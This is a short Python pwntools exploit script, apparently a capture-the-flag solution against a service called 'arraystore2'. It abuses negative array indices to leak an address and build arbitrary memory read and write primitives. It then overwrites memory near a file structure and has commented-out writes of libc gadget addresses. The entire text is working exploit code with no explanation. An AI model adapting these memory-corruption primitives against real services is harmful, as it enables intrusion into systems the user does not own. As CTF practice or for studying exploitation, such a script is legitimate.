from pwn import *
import binascii

#r = process('./arraystore2')
#r = remote('34.124.157.94', 32113)
r = remote('localhost', 32113)

def read(idx):
    if idx < 0:
        idx += 0x10000000000000000
    r.recvuntil(b"Read/Write/Random?: ")
    r.sendline(b"Read")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Value: ")
    return int(r.recvline().strip())

def write(idx, val):
    if idx < 0:
        idx += 0x10000000000000000
    r.recvuntil(b"Read/Write/Random?: ")
    r.sendline(b"Write")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Value: ")
    r.sendline(str(val).encode())

arrbase = read(-20) - 0x560ededa5000 + 0x560ededa50a0

def readaddr(addr):
    return read((addr - arrbase)//8)
def writeaddr(addr, val):
    write((addr - arrbase)//8, val)
          
randfile = read(-4)
#for i in range(100):
#    print(i, hex(readaddr(randfile + i * 8)))
for i in range(30):
    writeaddr(randfile + i * 8, i)
#write(121, libcbase + 0x0000000000014c2d)
#write(122, libcbase + 0x94ba6)
#write(123, libcbase + 0x0000000000041db8)

r.interactive()